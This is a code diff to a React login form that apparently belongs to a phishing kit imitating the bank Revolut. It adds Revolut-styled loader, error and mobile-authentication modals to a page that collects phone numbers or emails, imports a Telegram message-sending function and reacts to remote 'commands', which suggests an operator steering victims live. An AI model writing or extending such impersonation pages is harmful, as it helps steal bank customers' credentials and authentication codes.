@@ -9,6 +9,10 @@ import { sendMessageToTelegram } from '../lib/api';
 import { useCommand } from '../app/lib/CommandContext';
 import countriesData from '../app/lib/countries'
 import CountriesDropdown from '../components/CountriesDropdown'
+import RevoluteLoader from '../components/RevoluteLoader';
+import MobileAuthModal from '../components/MobileAuthModal'
+import ErrorModal from '../components/ErrorModal'
+
 
 export default function LoginForm() {
     const router = useRouter();
@@ -18,6 +22,35 @@ export default function LoginForm() {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [email, setEmail] = useState('');
     const [isValidInput, setIsValidInput] = useState(false);
+    // Handle all modals for this page
+    const [displayLoader, setDisplayLoader] = useState(false)
+    const [displayError, setDisplayError] = useState(false)
+    const [displayAuth, setDisplayAuth] = useState(false)
+
+    // Handle wether to display error for phone number or email
+    const [displayMessage, setDisplayMessage] = useState('phone')
+
+
+
+// This function displays the revolut Loader
+    const displayPageLoader = () => {
+        console.log("NOW DISPLAYING PAGE LOADER")
+        setDisplayLoader(!displayLoader)
+    }
+
+    // This function displays the Mobile Auth modal
+    const displayAuthModal = () => {
+        console.log("NOW DISPLAYING MOBILE AUTH MODAL")
+        setDisplayAuth(!displayAuth)
+    }
+
+    // This function displays the revolut error modal
+    const displayErrorModal = (errorType) => {
+        console.log("Now Displaying Error Modal")
+        setDisplayError(!displayError)
+        setDisplayMessage(errorType)
+    }
+
 
     // Handle command changes
     useEffect(() => {
